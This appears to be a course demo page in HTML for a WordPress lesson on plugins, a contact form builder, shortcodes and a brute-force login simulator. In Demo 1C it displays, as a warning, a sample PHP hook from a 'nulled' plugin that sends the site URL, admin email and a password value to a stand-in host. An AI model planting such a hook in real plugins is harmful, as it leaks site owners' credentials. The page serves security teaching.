@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Week 10 Session 2 — Plugins & Contact Forms Demo</title>
+
+  <!--
+    FILES IN THIS PACKAGE:
+    ├── index.html    — this file: all 4 demo sections
+    ├── style.css     — all visual styles
+    └── script.js     — form validation + shortcode simulator + security demo
+
+    NOTE: This is a FRONT-END-ONLY demo.
+    It shows students what each WordPress feature LOOKS and FEELS like
+    before they build it in WordPress.
+  -->
+  <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+
+  <!-- ============================================================
+    HEADER
+  ============================================================ -->
+  <header class="site-header">
+    <nav class="top-bar">
+      <span class="site-logo">Week 10 · Session 2</span>
+      <span class="week-label">Plugins &amp; Contact Forms</span>
+    </nav>
+    <hgroup class="hero-text">
+      <h1>Interactive Demo — All 4 Phases</h1>
+      <p>Phase 1: Plugins  ·  Phase 2: WPForms Builder  ·  Phase 3: Shortcodes  ·  Phase 4: Security</p>
+    </hgroup>
+  </header>
+
+
+  <!-- ============================================================
+    PHASE NAV
+  ============================================================ -->
+  <nav class="phase-nav" aria-label="Jump to demo section">
+    <a href="#phase-1" class="phase-nav-link">Phase 1 · Plugins</a>
+    <a href="#phase-2" class="phase-nav-link">Phase 2 · Contact Form</a>
+    <a href="#phase-3" class="phase-nav-link">Phase 3 · Shortcode</a>
+    <a href="#phase-4" class="phase-nav-link">Phase 4 · Security</a>
+  </nav>
+
+
+  <!-- ============================================================
+    MAIN
+  ============================================================ -->
+  <main class="page-content">
+
+
+    <!-- ══════════════════════════════════════════════════════════
+      PHASE 1 · WHAT IS A PLUGIN?
+      Demonstrates: Theme vs Plugin, Plugin anatomy
+    ══════════════════════════════════════════════════════════════ -->
+    <section class="demo-section" id="phase-1">
+      <header class="section-header header-blue">
+        <span class="phase-badge">Phase 1  ·  30 min</span>
+        <h2>Plugins — What They Are &amp; How They Work</h2>
+      </header>
+
+      <div class="section-body">
+
+        <!-- ── 1A: Theme vs Plugin toggle demo ── -->
+        <article class="demo-card" id="demo-theme-vs-plugin">
+          <h3 class="demo-card-title">Demo 1A — Theme vs Plugin: Toggle to See the Difference</h3>
+          <p class="demo-desc">
+            A <strong>Theme</strong> controls how the site <em>looks</em>.
+            A <strong>Plugin</strong> controls what the site <em>does</em>.
+            Click the buttons below to swap themes — notice the content never changes,
+            only the visual presentation does.
+          </p>
+
+          <!-- Theme switcher -->
+          <div class="theme-switcher" role="group" aria-label="Theme switcher demo">
+            <button class="theme-btn active" data-theme="default" onclick="switchTheme('default')">
+              Twenty Twenty-Four (Default)
+            </button>
+            <button class="theme-btn" data-theme="astra" onclick="switchTheme('astra')">
+              Astra Theme
+            </button>
+            <button class="theme-btn" data-theme="dark" onclick="switchTheme('dark')">
+              Dark News Theme
+            </button>
+          </div>
+
+          <!-- Live preview window that changes with the theme -->
+          <div class="site-preview" id="site-preview">
+            <div class="preview-header" id="preview-header">
+              <div class="preview-logo" id="preview-logo">TechWorld</div>
+              <nav class="preview-nav" id="preview-nav">
+                <span>Home</span><span>Blog</span><span>About</span><span>Contact</span>
+              </nav>
+            </div>
+            <div class="preview-hero" id="preview-hero">
+              <h2 id="preview-hero-title">Welcome to TechWorld</h2>
+              <p id="preview-hero-text">Your #1 source for tech news</p>
+              <button class="preview-cta" id="preview-cta">Read Our Blog</button>
+            </div>
+            <div class="preview-content" id="preview-content">
+              <article class="preview-post">
+                <div class="preview-post-img"></div>
+                <div class="preview-post-text">
+                  <strong>The Future of Quantum Computing</strong>
+                  <p>Category: Hardware</p>
+                </div>
+              </article>
+              <article class="preview-post">
+                <div class="preview-post-img"></div>
+                <div class="preview-post-text">
+                  <strong>Top 10 Programming Languages in 2025</strong>
+                  <p>Category: Software</p>
+                </div>
+              </article>
+            </div>
+          </div>
+
+          <p class="demo-note note-blue">
+            💡 <strong>Key takeaway:</strong> Both blog posts are still there after switching themes.
+            The DATABASE holds the content. The THEME controls the visual. They are completely separate.
+          </p>
+        </article>
+
+
+        <!-- ── 1B: Plugin anatomy ── -->
+        <article class="demo-card" id="demo-plugin-anatomy">
+          <h3 class="demo-card-title">Demo 1B — How a Plugin Adds a Menu Item</h3>
+          <p class="demo-desc">
+            When you <strong>Install &amp; Activate</strong> WPForms in WordPress,
+            it registers itself and adds a new item to the Dashboard left-hand menu.
+            This simulates what you will see:
+          </p>
+
+          <div class="plugin-install-demo">
+            <div class="pid-step pid-before">
+              <div class="pid-label">BEFORE installing WPForms</div>
+              <div class="mock-menu">
+                <div class="mm-item mm-active">Dashboard</div>
+                <div class="mm-item">Posts</div>
+                <div class="mm-item">Pages</div>
+                <div class="mm-item">Media</div>
+                <div class="mm-item">Appearance</div>
+                <div class="mm-item">Plugins</div>
+                <div class="mm-item">Settings</div>
+              </div>
+            </div>
+
+            <button class="install-plugin-btn" id="install-btn" onclick="simulateInstall()">
+              ▶ Install &amp; Activate WPForms
+            </button>
+
+            <div class="pid-step pid-after">
+              <div class="pid-label">AFTER activating WPForms</div>
+              <div class="mock-menu" id="menu-after">
+                <div class="mm-item mm-active">Dashboard</div>
+                <div class="mm-item">Posts</div>
+                <div class="mm-item">Pages</div>
+                <div class="mm-item">Media</div>
+                <div class="mm-item mm-new hidden" id="wpforms-menu-item">
+                  WPForms <span class="mm-new-badge">NEW!</span>
+                </div>
+                <div class="mm-item">Appearance</div>
+                <div class="mm-item">Plugins</div>
+                <div class="mm-item">Settings</div>
+              </div>
+            </div>
+          </div>
+
+          <p class="demo-note note-green" id="install-result" style="display:none;">
+            ✅ WPForms is now active! A new "WPForms" menu item appeared in the sidebar.
+            This is exactly what happens in your real WordPress Dashboard.
+          </p>
+        </article>
+
+
+        <!-- ── 1C: Security warning interactive ── -->
+        <article class="demo-card demo-danger" id="demo-security">
+          <h3 class="demo-card-title">Demo 1C — Plugin Security: Safe vs Dangerous Sources</h3>
+          <p class="demo-desc">
+            Click each installation source to see whether it is safe:
+          </p>
+
+          <div class="security-choices">
+            <button class="sc-btn sc-good"  onclick="checkSource('official')">
+              Install from WordPress Dashboard<br><small>(Plugins → Add New)</small>
+            </button>
+            <button class="sc-btn sc-bad"   onclick="checkSource('google')">
+              Download from a Google result<br><small>("free WPForms premium")</small>
+            </button>
+            <button class="sc-btn sc-bad"   onclick="checkSource('telegram')">
+              Get ZIP from Telegram group<br><small>("cracked plugins free")</small>
+            </button>
+            <button class="sc-btn sc-bad"   onclick="checkSource('pirate')">
+              Download "nulled" plugin<br><small>(pirated premium plugin)</small>
+            </button>
+          </div>
+
+          <div class="security-result" id="security-result" aria-live="polite"></div>
+
+          <!-- Hidden malware code reveal -->
+          <div class="malware-reveal hidden" id="malware-reveal">
+            <div class="mr-title">⚠️ Hidden code found inside the "free premium" plugin:</div>
+            <pre class="malware-code">
+<span class="mc-comment">// This code runs silently every time someone visits the site</span>
+<span class="mc-bad">add_action('wp_head', function() {</span>
+<span class="mc-bad">  @file_get_contents('https://hacker-server.com/steal.php?'</span>
+<span class="mc-bad">    . 'site=' . home_url()</span>
+<span class="mc-bad">    . '&user=' . get_option('admin_email')</span>
+<span class="mc-bad">    . '&pass=' . base64_encode(get_option('admin_password_hash'))</span>
+<span class="mc-bad">  );</span>
+<span class="mc-bad">});</span>
+<span class="mc-comment">// You will NEVER see this code. You will NEVER know it ran.</span></pre>
+          </div>
+        </article>
+
+      </div>
+    </section>
+
+
+    <!-- ══════════════════════════════════════════════════════════
+      PHASE 2 · CONTACT FORM BUILDER
+      Demonstrates: WPForms-style drag-and-drop form builder
+    ══════════════════════════════════════════════════════════════ -->
+    <section class="demo-section" id="phase-2">
+      <header class="section-header header-teal">
+        <span class="phase-badge">Phase 2  ·  45 min</span>
+        <h2>WPForms-Style Contact Form Builder</h2>
+      </header>
+
+      <div class="section-body">
+
+        <p class="phase-intro">
+          This demo simulates the WPForms drag-and-drop builder.
+          Toggle fields on/off to build your form, then see the live preview update instantly.
+        </p>
+
+        <div class="form-builder-layout">
+
+          <!-- Left: field panel -->
+          <aside class="field-panel">
+            <div class="fp-title">Available Fields</div>
+            <p class="fp-desc">Toggle each field to add or remove it from the form:</p>
+
+            <div class="field-toggle-list">
+
+              <label class="field-toggle ft-on">
+                <input type="checkbox" checked data-field="name" onchange="toggleField('name', this)">
+                <span class="ft-icon">T</span>
+                <div class="ft-info">
+                  <strong>Single Line Text</strong>
+                  <small>HTML: &lt;input type="text"&gt;</small>
+                </div>
+              </label>
+
+              <label class="field-toggle ft-on">
+                <input type="checkbox" checked data-field="email" onchange="toggleField('email', this)">
+                <span class="ft-icon">@</span>
+                <div class="ft-info">
+                  <strong>Email</strong>
+                  <small>HTML: &lt;input type="email"&gt;</small>
+                </div>
+              </label>
+
+              <label class="field-toggle">
+                <input type="checkbox" data-field="phone" onchange="toggleField('phone', this)">
+                <span class="ft-icon">#</span>
+                <div class="ft-info">
+                  <strong>Phone Number</strong>
+                  <small>HTML: &lt;input type="tel"&gt;</small>
+                </div>
+              </label>
+
+              <label class="field-toggle">
+                <input type="checkbox" data-field="subject" onchange="toggleField('subject', this)">
+                <span class="ft-icon">▾</span>
+                <div class="ft-info">
+                  <strong>Dropdown (Subject)</strong>
+                  <small>HTML: &lt;select&gt; + &lt;option&gt;</small>
+                </div>
+              </label>
+
+              <label class="field-toggle ft-on">
+                <input type="checkbox" checked data-field="message" onchange="toggleField('message', this)">
+                <span class="ft-icon">¶</span>
+                <div class="ft-info">
+                  <strong>Paragraph Text</strong>
+                  <small>HTML: &lt;textarea&gt;</small>
+                </div>
+              </label>
+
+              <label class="field-toggle">
+                <input type="checkbox" data-field="file" onchange="toggleField('file', this)">
+                <span class="ft-icon">📎</span>
+                <div class="ft-info">
+                  <strong>File Upload</strong>
+                  <small>HTML: &lt;input type="file"&gt;</small>
+                </div>
+              </label>
+
+              <label class="field-toggle">
+                <input type="checkbox" data-field="rating" onchange="toggleField('rating', this)">
+                <span class="ft-icon">★</span>
+                <div class="ft-info">
+                  <strong>Star Rating</strong>
+                  <small>Custom WPForms UI element</small>
+                </div>
+              </label>
+
+            </div>
+
+            <div class="fp-shortcode-box">
+              <div class="fp-sc-label">Your Shortcode:</div>
+              <code class="fp-sc-code" id="shortcode-preview">[wpforms id="1" title="false"]</code>
+              <button class="copy-sc-btn" onclick="copyShortcode()">Copy</button>
+            </div>
+          </aside>
+
+          <!-- Right: live form preview -->
+          <div class="form-preview-panel">
+            <div class="fpp-title">Live Form Preview</div>
+            <div class="fpp-subtitle">This is what students see on your Contact page:</div>
+
+            <form class="wp-form-preview" id="contact-form-preview" onsubmit="submitForm(event)" novalidate>
+
+              <!-- Name field -->
+              <div class="wf-field" id="field-name">
+                <label class="wf-label">
+                  Full Name <span class="wf-required">*</span>
+                </label>
+                <input
+                  type="text"
+                  class="wf-input"
+                  id="input-name"
+                  placeholder="e.g. Sokha Mony"
+                  autocomplete="off"
+                />
+                <div class="wf-error" id="err-name"></div>
+              </div>
+
+              <!-- Email field -->
+              <div class="wf-field" id="field-email">
+                <label class="wf-label">
+                  Email Address <span class="wf-required">*</span>
+                </label>
+                <input
+                  type="email"
+                  class="wf-input"
+                  id="input-email"
+                  placeholder="e.g. sokha@example.com"
+                  autocomplete="off"
+                />
+                <div class="wf-error" id="err-email"></div>
+              </div>
+
+              <!-- Phone field (hidden by default) -->
+              <div class="wf-field hidden" id="field-phone">
+                <label class="wf-label">Phone Number</label>
+                <input type="tel" class="wf-input" id="input-phone" placeholder="e.g. 012 345 678" />
+              </div>
+
+              <!-- Subject dropdown (hidden by default) -->
+              <div class="wf-field hidden" id="field-subject">
+                <label class="wf-label">
+                  Subject <span class="wf-required">*</span>
+                </label>
+                <select class="wf-select" id="input-subject">
+                  <option value="">— Select a subject —</option>
+                  <option value="general">General Inquiry</option>
+                  <option value="support">Support</option>
+                  <option value="sales">Sales</option>
+                </select>
+                <div class="wf-error" id="err-subject"></div>
+              </div>
+
+              <!-- Message field -->
+              <div class="wf-field" id="field-message">
+                <label class="wf-label">
+                  Message <span class="wf-required">*</span>
+                </label>
+                <textarea
+                  class="wf-textarea"
+                  id="input-message"
+                  rows="5"
+                  placeholder="Write your message here..."
+                ></textarea>
+                <div class="wf-error" id="err-message"></div>
+              </div>
+
+              <!-- File upload (hidden by default) -->
+              <div class="wf-field hidden" id="field-file">
+                <label class="wf-label">Attach a File (optional)</label>
+                <input type="file" class="wf-input" id="input-file" />
+              </div>
+
+              <!-- Star rating (hidden by default) -->
+              <div class="wf-field hidden" id="field-rating">
+                <label class="wf-label">How did you hear about us?</label>
+                <div class="star-rating" id="star-rating">
+                  <span class="star" data-val="1" onclick="setRating(1)">★</span>
+                  <span class="star" data-val="2" onclick="setRating(2)">★</span>
+                  <span class="star" data-val="3" onclick="setRating(3)">★</span>
+                  <span class="star" data-val="4" onclick="setRating(4)">★</span>
+                  <span class="star" data-val="5" onclick="setRating(5)">★</span>
+                </div>
+                <input type="hidden" id="input-rating" value="0" />
+              </div>
+
+              <button type="submit" class="wf-submit">Send Message</button>
+
+            </form>
+
+            <!-- Success message (shown after valid submit) -->
+            <div class="form-success hidden" id="form-success">
+              <div class="fs-icon">✓</div>
+              <div class="fs-title">Thanks for contacting us!</div>
+              <div class="fs-body">
+                We have received your message and will get back to you within 24 hours.
+                <br><br>
+                <strong>On localhost:</strong> No email is actually sent —
+                but in a real WordPress deployment, WPForms would email
+                you the submission automatically.
+              </div>
+              <button class="fs-reset" onclick="resetForm()">Send another message</button>
+            </div>
+
+          </div>
+        </div>
+
+        <!-- Validation explainer -->
+        <div class="validation-explainer">
+          <div class="ve-title">How WPForms Validation Works — vs HTML/CSS/JS Week 6</div>
+          <div class="ve-comparison">
+            <div class="ve-col ve-html">
+              <div class="ve-label">Week 6 — You wrote this manually (~40 lines)</div>
+              <pre class="ve-code">
+<span class="vc-comment">// JavaScript you wrote in Week 6</span>
+<span class="vc-kw">function</span> <span class="vc-fn">validateForm</span>() {
+  <span class="vc-kw">const</span> email = document.getElementById(<span class="vc-str">'email'</span>).value;
+  <span class="vc-kw">const</span> emailRegex = <span class="vc-str">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>;
+  <span class="vc-kw">if</span> (!emailRegex.test(email)) {
+    showError(<span class="vc-str">'Please enter a valid email'</span>);
+    <span class="vc-kw">return false</span>;
+  }
+  <span class="vc-comment">// ... 35 more lines for other fields ...</span>
+}</pre>
+            </div>
+            <div class="ve-arrow">→</div>
+            <div class="ve-col ve-wp">
+              <div class="ve-label">WPForms — Zero code, same result</div>
+              <div class="ve-wp-steps">
+                <div class="vws-item">
+                  <span class="vws-num">1</span>
+                  <span>Drag field into builder</span>
+                </div>
+                <div class="vws-item">
+                  <span class="vws-num">2</span>
+                  <span>Toggle "Required" ON</span>
+                </div>
+                <div class="vws-item">
+                  <span class="vws-num">3</span>
+                  <span>For Email fields: validation is automatic</span>
+                </div>
+                <div class="vws-item">
+                  <span class="vws-num">4</span>
+                  <span>WPForms handles HTML + CSS + JS + PHP</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+
+    <!-- ══════════════════════════════════════════════════════════
+      PHASE 3 · SHORTCODE SIMULATOR
+      Demonstrates: What shortcodes are and how they work
+    ══════════════════════════════════════════════════════════════ -->
+    <section class="demo-section" id="phase-3">
+      <header class="section-header header-purple">
+        <span class="phase-badge">Phase 3  ·  30 min</span>
+        <h2>Shortcodes — The WordPress Injection System</h2>
+      </header>
+
+      <div class="section-body">
+
+        <!-- ── 3A: What shortcodes are ── -->
+        <article class="demo-card">
+          <h3 class="demo-card-title">Demo 3A — Shortcode Simulator</h3>
+          <p class="demo-desc">
+            A <strong>shortcode</strong> is a small text tag in square brackets
+            that WordPress replaces with complex PHP output.
+            Type a shortcode in the editor below and click Render to see what happens:
+          </p>
+
+          <!-- Simulated Gutenberg editor -->
+          <div class="gutenberg-sim">
+
+            <div class="gs-toolbar">
+              <span class="gs-tool">B</span>
+              <span class="gs-tool"><em>I</em></span>
+              <span class="gs-tool">🔗</span>
+              <span class="gs-tool active">{ }</span>
+              <span class="gs-label">← Shortcode block selected</span>
+            </div>
+
+            <div class="gs-editor">
+              <div class="gs-paragraph">Welcome to our Contact page. Please use the form below to get in touch.</div>
+              <div class="gs-shortcode-block">
+                <div class="gsb-label">Shortcode Block</div>
+                <input
+                  type="text"
+                  class="gsb-input"
+                  id="shortcode-input"
+                  value='[wpforms id="1" title="false"]'
+                  aria-label="Shortcode input"
+                />
+                <button class="gsb-render-btn" onclick="renderShortcode()">▶  Render Shortcode</button>
+              </div>
+              <div class="gs-paragraph">Thank you for your message!</div>
+            </div>
+
+          </div>
+
+          <!-- What WordPress renders -->
+          <div class="shortcode-output" id="shortcode-output" aria-live="polite">
+            <div class="so-label">WordPress renders this on the page →</div>
+            <div class="so-content" id="so-content">
+              <em style="color:var(--text-light);">Click "Render Shortcode" to see the output...</em>
+            </div>
+          </div>
+
+          <p class="demo-note note-blue">
+            💡 <strong>How shortcodes work:</strong> WordPress scans all page content for <code>[text in brackets]</code>.
+            When it finds one, it calls the PHP function that was registered for that shortcode.
+            The PHP function generates and returns the full HTML output, which replaces the shortcode text.
+          </p>
+        </article>
+
+
+        <!-- ── 3B: Try different shortcodes ── -->
+        <article class="demo-card">
+          <h3 class="demo-card-title">Demo 3B — Shortcode Examples</h3>
+          <p class="demo-desc">
+            Shortcodes are used by many WordPress plugins and even WordPress itself.
+            Click any example to load it in the simulator above:
+          </p>
+
+          <div class="shortcode-examples">
+
+            <div class="se-item" onclick="loadShortcode('[wpforms id=\\'1\\' title=\\'false\\']')">
+              <div class="se-code">[wpforms id="1" title="false"]</div>
+              <div class="se-name">WPForms — embed contact form #1</div>
+              <div class="se-plugin">Plugin: WPForms</div>
+            </div>
+
+            <div class="se-item" onclick="loadShortcode('[contact-form-7 id=\\'cf7-1\\' title=\\'Contact form 1\\']')">
+              <div class="se-code">[contact-form-7 id="cf7-1" title="Contact form 1"]</div>
+              <div class="se-name">Contact Form 7 — alternative form plugin</div>
+              <div class="se-plugin">Plugin: Contact Form 7</div>
+            </div>
+
+            <div class="se-item" onclick="loadShortcode('[gallery ids=\\'1,2,3\\' columns=\\'3\\']')">
+              <div class="se-code">[gallery ids="1,2,3" columns="3"]</div>
+              <div class="se-name">WordPress built-in image gallery</div>
+              <div class="se-plugin">Built into WordPress core</div>
+            </div>
+
+            <div class="se-item" onclick="loadShortcode('[youtube url=\\'https://youtube.com/watch?v=abc\\']')">
+              <div class="se-code">[youtube url="https://youtube.com/watch?v=abc"]</div>
+              <div class="se-name">Embed a YouTube video</div>
+              <div class="se-plugin">Plugin: WP YouTube Embed</div>
+            </div>
+
+          </div>
+
+          <!-- Shortcode anatomy breakdown -->
+          <div class="shortcode-anatomy">
+            <div class="sa-title">Anatomy of a Shortcode</div>
+            <div class="sa-diagram">
+              <code class="sa-code">[wpforms  id="1"  title="false"]</code>
+              <div class="sa-parts">
+                <div class="sa-part" style="left:1px; width:80px;">
+                  <div class="sa-line"></div>
+                  <div class="sa-label">Shortcode name<br>(the plugin)</div>
+                </div>
+                <div class="sa-part" style="left:108px; width:55px;">
+                  <div class="sa-line"></div>
+                  <div class="sa-label">Attribute<br>(which form)</div>
+                </div>
+                <div class="sa-part" style="left:180px; width:80px;">
+                  <div class="sa-line"></div>
+                  <div class="sa-label">Attribute<br>(show title?)</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </article>
+
+      </div>
+    </section>
+
+
+    <!-- ══════════════════════════════════════════════════════════
+      PHASE 4 · SECURITY — BRUTE-FORCE SIMULATOR
+      Demonstrates: How brute-force attacks work and how LLA stops them
+    ══════════════════════════════════════════════════════════════ -->
+    <section class="demo-section" id="phase-4">
+      <header class="section-header header-red">
+        <span class="phase-badge">Phase 4  ·  15 min</span>
+        <h2>Security — Brute-Force Attack Simulator</h2>
+      </header>
+
+      <div class="section-body">
+
+        <p class="phase-intro">
+          This simulator shows what happens when a bot repeatedly tries to log in to WordPress.
+          See the difference between an <strong>unprotected</strong> site
+          and one with <strong>Limit Login Attempts Reloaded</strong> active.
+        </p>
+
+        <!-- ── 4A: Brute force simulator ── -->
+        <article class="demo-card">
+          <h3 class="demo-card-title">Demo 4A — WordPress Login Attack Simulator</h3>
+
+          <!-- Controls -->
+          <div class="brute-controls">
+            <div class="bc-setting">
+              <label>Protection status:</label>
+              <div class="toggle-group">
+                <button class="tg-btn active" id="btn-unprotected" onclick="setProtection(false)">
+                  ❌ Unprotected
+                </button>
+                <button class="tg-btn" id="btn-protected" onclick="setProtection(true)">
+                  ✅ Limit Login Attempts Active
+                </button>
+              </div>
+            </div>
+            <div class="bc-setting">
+              <label>Attack speed:</label>
+              <select class="bc-select" id="speed-select">
+                <option value="600">Slow (1 try/0.6s) — educational view</option>
+                <option value="200" selected>Fast (1 try/0.2s) — realistic</option>
+                <option value="50">Very Fast (1 try/0.05s) — real bots</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Login form mock -->
+          <div class="wp-login-mock" id="wp-login-mock">
+            <div class="wlm-header">
+              <div class="wlm-logo">W</div>
+              <div class="wlm-title">Log In</div>
+            </div>
+            <div class="wlm-field">
+              <label>Username</label>
+              <div class="wlm-input" id="attack-username">admin</div>
+            </div>
+            <div class="wlm-field">
+              <label>Password</label>
+              <div class="wlm-input wlm-password" id="attack-password">••••••••</div>
+            </div>
+            <div class="wlm-btn" id="wlm-submit">Log In</div>
+            <div class="wlm-error hidden" id="wlm-error">
+              ❌ ERROR: The password you entered is incorrect.
+            </div>
+            <div class="wlm-lockout hidden" id="wlm-lockout">
+              🔒 Too many failed login attempts.<br>
+              Your IP (192.168.1.100) has been locked out for 20 minutes.
+            </div>
+          </div>
+
+          <!-- Attack controls + log -->
+          <div class="attack-panel">
+            <div class="ap-controls">
+              <button class="ap-start-btn" id="ap-start" onclick="startAttack()">
+                ▶ Start Bot Attack
+              </button>
+              <button class="ap-stop-btn hidden" id="ap-stop" onclick="stopAttack()">
+                ⏹ Stop Attack
+              </button>
+              <button class="ap-reset-btn" onclick="resetAttack()">
+                ↺ Reset
+              </button>
+            </div>
+
+            <div class="ap-stats">
+              <div class="ap-stat">
+                <span class="as-num" id="stat-attempts">0</span>
+                <span class="as-label">Attempts</span>
+              </div>
+              <div class="ap-stat">
+                <span class="as-num" id="stat-blocked">0</span>
+                <span class="as-label">Blocked</span>
+              </div>
+              <div class="ap-stat">
+                <span class="as-num" id="stat-status">Running...</span>
+                <span class="as-label">Status</span>
+              </div>
+            </div>
+
+            <!-- Attack log -->
+            <div class="attack-log" id="attack-log" aria-live="polite">
+              <div class="al-header">Bot Attack Log</div>
+              <div class="al-entries" id="al-entries">
+                <div class="al-entry al-info">Waiting for attack to start...</div>
+              </div>
+            </div>
+          </div>
+
+        </article>
+
+
+        <!-- ── 4B: LLA Settings reference ── -->
+        <article class="demo-card">
+          <h3 class="demo-card-title">Demo 4B — Limit Login Attempts Settings Panel</h3>
+          <p class="demo-desc">
+            After installing the plugin, configure it at
+            <strong>Settings → Limit Login Attempts</strong>.
+            This is what the settings page looks like:
+          </p>
+
+          <!-- Mock LLA settings panel -->
+          <div class="lla-settings">
+            <div class="lla-title">Limit Login Attempts — Settings</div>
+
+            <div class="lla-field">
+              <label class="lla-label">Allowed retries</label>
+              <input type="number" class="lla-input" value="4" min="1" max="20" id="lla-retries" />
+              <span class="lla-hint">failed attempts before lockout</span>
+            </div>
+
+            <div class="lla-field">
+              <label class="lla-label">Lockout period</label>
+              <input type="number" class="lla-input" value="20" min="1" max="1440" id="lla-lockout" />
+              <span class="lla-hint">minutes</span>
+            </div>
+
+            <div class="lla-field">
+              <label class="lla-label">After</label>
+              <input type="number" class="lla-input" value="2" min="1" max="10" id="lla-lockouts" />
+              <span class="lla-hint">lockouts → extend lockout to</span>
+              <input type="number" class="lla-input" value="24" min="1" max="720" id="lla-extended" />
+              <span class="lla-hint">hours</span>
+            </div>
+
+            <div class="lla-field">
+              <label class="lla-label">Notify on lockout</label>
+              <select class="lla-select">
+                <option>Log only</option>
+                <option>Email admin after 3 lockouts</option>
+                <option>Email admin immediately</option>
+              </select>
+            </div>
+
+            <button class="lla-save" onclick="saveLLASettings()">Save Changes</button>
+            <div class="lla-saved hidden" id="lla-saved">✅ Settings saved!</div>
+
+            <!-- Stats -->
+            <div class="lla-stats-box">
+              <div class="lsb-title">Statistics</div>
+              <div class="lsb-row">
+                <span>Total lockouts today:</span>
+                <strong id="lla-stat-lockouts">0</strong>
+              </div>
+              <div class="lsb-row">
+                <span>Currently locked out IPs:</span>
+                <strong id="lla-stat-ips">0</strong>
+              </div>
+              <div class="lsb-row">
+                <span>Total attempts blocked:</span>
+                <strong id="lla-stat-total">0</strong>
+              </div>
+            </div>
+          </div>
+
+          <p class="demo-note note-green">
+            ✅ With just 4 allowed retries, a bot that tries 10,000 passwords
+            gets blocked after its <strong>4th attempt</strong>.
+            That is a <strong>99.96% reduction</strong> in attack surface — for free, in 2 minutes.
+          </p>
+        </article>
+
+      </div>
+    </section>
+
+
+  </main>
+
+
+  <!-- ============================================================
+    FOOTER
+  ============================================================ -->
+  <footer class="site-footer">
+    <p>
+      Web Client Programming &nbsp;·&nbsp; Week 10 Session 02 &nbsp;·&nbsp;
+      Essential Plugins &amp; Contact Forms
+    </p>
+  </footer>
+
+  <script src="script.js"></script>
+
+</body>
+</html>
